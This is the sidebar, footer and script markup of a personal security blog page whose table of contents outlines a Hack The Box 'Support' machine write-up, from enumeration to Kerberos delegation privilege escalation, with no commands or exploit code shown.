class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/BkingXD"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTB-Support"><span class="toc-number">1.</span> <span class="toc-text">HTB-Support</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">nmap扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.2.</span> <span class="toc-text">DNS扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB%E6%9E%9A%E4%B8%BE"><span class="toc-number">1.1.3.</span> <span class="toc-text">SMB枚举</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90UserInfo-exe"><span class="toc-number">1.2.</span> <span class="toc-text">分析UserInfo.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ldapsearch%E8%8E%B7%E5%8F%96%E5%9F%9F%E4%B8%AD%E4%BF%A1%E6%81%AF"><span class="toc-number">1.3.</span> <span class="toc-text">ldapsearch获取域中信息</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96user-flag"><span class="toc-number">1.3.1.</span> <span class="toc-text">获取user flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF"><span class="toc-number">1.4.1.</span> <span class="toc-text">寻找提权信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.2.</span> <span class="toc-text">基于资源的约束委派攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F%EF%BC%9F"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">？？？？？？？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E5%B9%B6%E4%BD%BF%E7%94%A8%E7%A5%A8%E8%AF%81"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">伪造并使用票证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.5.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/02/HTB-Support/" title="HTB-Support"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Support"/></a><div class="content"><a class="title" href="/2022/12/02/HTB-Support/" title="HTB-Support">HTB-Support</a><time datetime="2022-12-02T12:16:45.000Z" title="Created 2022-12-02 20:16:45">2022-12-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94CommonCollections1/" title="Java反序列化——CommonCollections1"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java反序列化——CommonCollections1"/></a><div class="content"><a class="title" href="/2022/11/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94CommonCollections1/" title="Java反序列化——CommonCollections1">Java反序列化——CommonCollections1</a><time datetime="2022-11-27T08:32:23.000Z" title="Created 2022-11-27 16:32:23">2022-11-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/25/HTB-Shoppy/" title="HTB-Shoppy"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Shoppy"/></a><div class="content"><a class="title" href="/2022/11/25/HTB-Shoppy/" title="HTB-Shoppy">HTB-Shoppy</a><time datetime="2022-11-25T12:16:45.000Z" title="Created 2022-11-25 20:16:45">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/18/HTB-RedPanda/" title="HTB-RedPanda"><img src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-RedPanda"/></a><div class="content"><a class="title" href="/2022/11/18/HTB-RedPanda/" title="HTB-RedPanda">HTB-RedPanda</a><time datetime="2022-11-18T10:13:25.000Z" title="Created 2022-11-18 18:13:25">2022-11-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="Java反序列化——URLDNS链分析"><img src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Java反序列化——URLDNS链分析"/></a><div class="content"><a class="title" href="/2022/11/05/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE%E5%88%86%E6%9E%90/" title="Java反序列化——URLDNS链分析">Java反序列化——URLDNS链分析</a><time datetime="2022-11-05T13:07:15.000Z" title="Created 2022-11-05 21:07:15">2022-11-05</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By BkingXD</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
